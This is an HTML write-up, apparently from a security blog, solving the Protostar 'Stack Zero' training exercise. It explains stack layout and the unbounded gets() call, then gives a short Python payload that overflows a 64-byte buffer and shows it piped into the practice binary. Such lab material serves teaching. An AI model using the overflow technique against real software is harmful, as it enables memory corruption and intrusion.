<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>pwncone.io</title>
    <link rel="stylesheet" href="../../../../css/style.css">
  </head>

<body>
<section>

    <writeup>
        <h1><strong>#Protostar - Stack Zero</strong></h1>
        <a href="https://exploit.education/protostar/stack-zero/">https://exploit.education/protostar/stack-zero/</a><br>
        <br>
        <img alt="images\13-1.png" src="images/13-1.png"><br>
        <br>
        <a id="h3-1" name="h3-1"></a><strong></strong>
        <h3><strong>Solution</strong></h3><br>
        To solve this level, we need to change the <code>modified</code> variable to be anything but 0.<br>
        To do this, we overflow the <code>buffer</code> variable and write a value to where modified is stored on the stack.<br>
        <br>
        <a id="h3-2" name="h3-2"></a><strong></strong>
        <h3><strong>Explanation of the Stack</strong></h3><br>
        Variables local to a function get stored on the stack.<br>
        The stack is a first in, last out structure.<br>
        Therefore, the first variable in the source code - <code>modified</code>, will be placed onto the stack first.<br>
        Next, <code>buffer</code> will be placed onto the stack, which is the second variable in the source code.<br>
        <br>
        The stack grows to lower memory addresses.<br>
        In this diagram, the stack grows upwards.<br>
        <br>
        Here's a diagram of the stack.<br>
            <div class="codebox">
                _________________<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Local&nbsp;Variable&nbsp;2<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;�&nbsp;64&nbsp;bytes&nbsp;large<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |________________|<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;modified&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Local&nbsp;Variable&nbsp;1<br>
                |&nbsp;_______________|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;�&nbsp;4&nbsp;bytes&nbsp;large<br>
                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;old&nbsp;EBP&nbsp;&nbsp;&nbsp;&nbsp;|<br>
                |________________|<br>
                |&nbsp;&nbsp;ret&nbsp;address&nbsp;&nbsp;&nbsp;|<br>
                |________________|
            </div>
        </div><br>
        <br>
        <code>gets()</code>, which takes input from the user and stores it in a variable, is a vulnerable function because it has no bounds checking.<br>
        This means that we can fill the <code>buffer</code> variable with more than 64 bytes and overwrite the <code>modified</code> variable that's below it.<br>
        <br>
        <a id="h2-1" name="h2-1"></a><strong></strong>
        <h2><strong>1) Write exploit</strong></h2><br>
        First, we write 64 bytes of junk to fill the <code>buffer</code> variable.<br>
        After that, we write 4 bytes of data to overwrite the <code>modified</code> variable.<br>
        <br>
        You can write anything into modified so long as it's not 0, and you'll win.<br>
        I've chosen to write <code>0xdeadc0de</code>.<br>
        <br>
        We use <code>struct.pack('&lt;I'</code> to pack the <code>0xdeadc0de</code> in the 32-bit little endian format.<br>
        (which will look like this - \xde\xc0\xad\de )<br>
            <div class="codebox">
                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
                <span style="color:#0088ff;font-weight:400">#&nbsp;exploit.education&nbsp;-&nbsp;Stack&nbsp;Zero</span><br>
                <br>
                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
                <br>
                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">64</span><br>
                payload&nbsp;+=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;I'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0xdeadc0de</span>)<br>
                <br>
                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
            </div>
        </div><br>
        <br>
        <a id="h2-2" name="h2-2"></a><strong></strong>
        <h2><strong>2) Win</strong></h2><br>
        Run your exploit and pipe the output to stack0.<br>
            <div class="codebox">
                $&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>python&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>tmp<span style="color:#ff9d00;font-weight:700">/</span>stack0.py<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>stack0<br>
                you&nbsp;have&nbsp;changed&nbsp;the&nbsp;<span style="color:#3ad900;font-weight:400">'modified'</span>&nbsp;variable
            </div>
        </div><br>
        <br>
        Success!<br>
        We've changed the <code>modified</code> variable :)<br>
    </writeup>
</section>
</body>
</html>